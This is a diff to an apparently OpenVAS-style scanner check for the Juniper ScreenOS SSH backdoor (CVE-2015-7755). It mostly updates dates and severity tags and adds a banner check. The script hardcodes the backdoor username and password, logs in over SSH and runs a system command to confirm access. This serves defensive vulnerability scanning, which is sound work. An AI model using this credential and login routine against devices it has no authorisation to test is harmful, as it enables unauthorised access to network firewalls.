@@ -10,7 +10,7 @@ if(description)
   script_cve_id("CVE-2015-7755", "CVE-2015-7754");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("2023-07-25T05:05:58+0000");
+  script_version("2023-12-20T05:05:58+0000");
 
   script_name("Backdoor in ScreenOS (SSH)");
 
@@ -33,7 +33,10 @@ if(description)
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"exploit");
 
-  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
+  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
+  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
+  script_tag(name:"severity_origin", value:"NVD");
+  script_tag(name:"severity_date", value:"2016-12-07 18:25:00 +0000 (Wed, 07 Dec 2016)");
   script_tag(name:"creation_date", value:"2015-12-21 10:33:33 +0100 (Mon, 21 Dec 2015)");
   script_category(ACT_ATTACK);
   script_family("Default Accounts");
@@ -58,6 +61,10 @@ port = ssh_get_port( default:22 );
 if( ssh_dont_try_login( port:port ) )
   exit( 0 );
 
+# nb: No need to continue/start if we haven't received any banner...
+if( ! ssh_get_serverbanner( port:port ) )
+  exit( 0 );
+
 if( ! soc = open_sock_tcp( port ) )
   exit( 0 );
 
@@ -66,13 +73,13 @@ user = "netscreen";
 pass = "<<< %s(un='%s') = %u";
 
 login = ssh_login( socket:soc, login:user, password:pass, priv:NULL, passphrase:NULL );
-if( login == 0 )
-{
+if( login == 0 ) {
+
   cmd = "get system";
   res = ssh_cmd( socket:soc, cmd:cmd, nosh:TRUE, pty:TRUE, pattern:"Software Version: " );
   close( soc );
-  if( "Product Name:" >< res && "FPGA checksum" >< res && "Compiled by build_master at" >< res )
-  {
+
+  if( "Product Name:" >< res && "FPGA checksum" >< res && "Compiled by build_master at" >< res ) {
     report = 'It was possible to login as user "' + user + '" with password "' + pass + '" and to execute the "' + cmd + '" command. Result:\n\n' + res;
     security_message( port:port, data:report );
     exit( 0 );
